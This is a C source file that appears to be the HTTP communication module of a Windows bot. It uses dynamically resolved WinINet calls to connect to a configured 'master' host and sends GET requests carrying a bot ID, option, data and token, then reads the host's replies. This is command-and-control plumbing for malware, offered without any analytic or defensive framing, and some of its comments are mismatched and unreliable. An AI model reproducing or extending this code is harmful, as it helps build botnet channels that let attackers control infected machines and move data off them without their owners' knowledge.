#include "api.h"
#include "config.h"
#include "info.h"
#include "http.h"


void *hInet = 0x00;
void *hConnect = 0x00;

void * __hxxp_connect() {
	if ((hInet = _InternetOpenA((unsigned char *)USER_AGENT, 0x01, 0x00, 0x00, 0x00)) == 0x00) { //INTERNET_FLAG_ASYNC
		return((void *)0xFFFFFFFF);
	}



	if ((hConnect = _InternetConnectA(hInet, (unsigned char*)HOST, PORT, 0x00, 0x00, 0x03, 0x04400000, 0x00)) == 0x00) {
		return((void *)0xFFFFFFFF);
	}

	return(hConnect);
}

int __hxxp_request(int option, char *data, char *token) {
	void *get = (char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000*6);
	void *hRequest;
	int len;
	char buff[120];

	_ZeroMemory(buff, 120);

	_snprintf((char *)get, 0x1000*6, MSG_FORMAT,__get_botid(),  option, data, token);

	hRequest = _HttpOpenRequestA(hConnect, (unsigned char *)METHOD, (unsigned char *)get, (unsigned char *)"HTTP/1.1", 0x00, 0x00, 0xa404f700, 0x00);
	_HttpSendRequestA(hRequest, 0x00, 0x00, 0x00, 0x00);
	_InternetReadFile(hRequest, buff, 120, &len);
	_InternetCloseHandle(hRequest);
	_HeapFree(_GetProcessHeap(), 0x00000001, get);
	return(0);
}

int __hxxp_reply(char *reply) {
	void *get = (char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000 * 6);
	void *hRequest;
	int len;
	
	_snprintf((char *)get, 0x1000 * 6, MSG_FORMAT, __get_botid(), 0, "", "");

	hRequest = _HttpOpenRequestA(hConnect, (unsigned char *)METHOD, (unsigned char *)get, (unsigned char *)"HTTP/1.1", 0x00, 0x00, 0xa404f700, 0x00);
	_HttpSendRequestA(hRequest, 0x00, 0x00, 0x00, 0x00);
	_InternetReadFile(hRequest, reply, 2048, &len);
	_InternetCloseHandle(hRequest);
	_HeapFree(_GetProcessHeap(), 0x00000001, get);
	return(len);
}

int __hxxp_close() {
	if(hConnect)
		_InternetCloseHandle(hConnect);
	if(hInet)
		_InternetCloseHandle(hInet);
	
	return(0);
}

/**
 * @brief Connect via HTTP for comunication to master
 * @returns 0xFFFFFFFF if error
 *          HANDLE to request if success
 */
void * __http_connect(char *get) {
	void *hRequest = 0x00;
	unsigned long len=0x00;




	if((hInet=_InternetOpenA((unsigned char *)USER_AGENT, 0x01, 0x00, 0x00, 0x00))==0x00) { //INTERNET_FLAG_ASYNC
		return((void *)0xFFFFFFFF);
	}
	
	
	
	if((hConnect=_InternetConnectA(	hInet,(unsigned char*)HOST, PORT, 0x00, 0x00, 0x03,	0x04400000,	0x00))==0x00) {
		return((void *)0xFFFFFFFF);
	}

	
	if((hRequest=_HttpOpenRequestA(hConnect, (unsigned char *)METHOD, (unsigned char *)get, (unsigned char *)"HTTP/1.1", 0x00, 0x00, 0xa404f700,0x00))==0x00) {
		return((void *)0xFFFFFFF);
	}
	
/*	if(_HttpSendRequestA(hRequest, NULL, 0, NULL, 0)==FALSE) {
		return(0xFFFFFFFF);		
	}
*/

	return(hRequest);
}


/**
 * @brief Make full post request from 
 * @param original input original encoded string
 * @param original_len length of original string 
 * @param encode output base64 decode string
 * @encoded_len output base64 decode string length
 * @returns 0 if error
 *          1 if encoded success
 */

int __http_make_get(char *get_data, char *option, char *data, char *token) {
	if((_lstrlenA(option)+_lstrlenA(data)+_lstrlenA(token)+_lstrlenA(PATH)+_lstrlenA(VAR_BID)+33)>2048) {
		return(0xFFFFFFFF);
	}

	if(_lstrcpynA(get_data, PATH, _lstrlenA(PATH)+1)==NULL)
		return(0xFFFFFFFF);

	if(_lstrcatA(get_data, VAR_BID)==NULL)
		return(0xFFFFFFF);

	if(_lstrcatA(get_data, __get_botid())==NULL)
		return(0xFFFFFFF);


	if(_lstrcatA(get_data, VAR_OPTION)==NULL) {
		return(0xFFFFFFFF);
	}

	if(_lstrcatA(get_data, option)==NULL) {
                return(0xFFFFFFFF);
	}	
		
	if(_lstrcatA(get_data, VAR_DATA)==NULL) {
                return(0xFFFFFFFF);
	}

	if(_lstrcatA(get_data, data)==NULL) {
                return(0xFFFFFFFF);
	}
/*
	if(_lstrcatA(get_data, VAR_TOKEN)==NULL) {
                return(0xFFFFFFFF);
	}
	
	if(_lstrcatA(get_data, token)==NULL) {
                return(0xFFFFFFFF);
	}

	if(_lstrcatA(get_data, HTTP_RETURN)==NULL) {
		return(0xFFFFFFFF);
	}
*/
	return(_lstrlenA(get_data));
	

}




int __http_reply(char *get_data, char *reply) {
	int datalen = _lstrlenA(get_data)+1;
	unsigned long len=0x00;
	unsigned long replylen=_lstrlenA(reply)+1;
	void *hRequest = (void *)0x00;


	if(!(hRequest=__http_connect(get_data)))
		return -1;


	if(datalen==0) {
		datalen=sizeof(char *);
	}	
	
	if(_HttpSendRequestA(hRequest, 0x00,0x00,0x00,0x00)==0x00) {
		return(0xFFFFFFFF);		
	}

	else {
		if(_InternetReadFile(hRequest, reply,replylen, &len)==0x00) {
			return(0xFFFFFFFF);
		}
	}
	


	__http_close(hRequest);
	return(len);
}


int __http_read(char *get_data, char *reply) {
	void *hRequest = NULL;
	unsigned long len=NULL;
	unsigned long replylen = 20000;
	char *header = (char *)_HeapAlloc(_GetProcessHeap(), 0x00000008, 1024);

	_ZeroMemory(header, 1024);

	if(!(hRequest = __http_connect(get_data)))
		return -1;

	if(_HttpSendRequestA(hRequest, 0x00, 0x00, 0x00,0x00)==0x00) {
		_HeapFree(_GetProcessHeap(),0x00000001,header);
		return(0xFFFFFFFF);		
	}

	else {
		if(_InternetReadFile(hRequest, reply,replylen, &len)==0x01) {
			_HeapFree(_GetProcessHeap(),0x00000001,header);
			return(_lstrlenA(reply));
		}
	}
	
	if(header)
		_HeapFree(_GetProcessHeap(),0x00000001,header);


	__http_close(hRequest);
	return(len);
}





// CLOSE
int __http_close(void *hRequest) {
	_InternetCloseHandle(hConnect);
	_InternetCloseHandle(hInet);
	return(0);
}

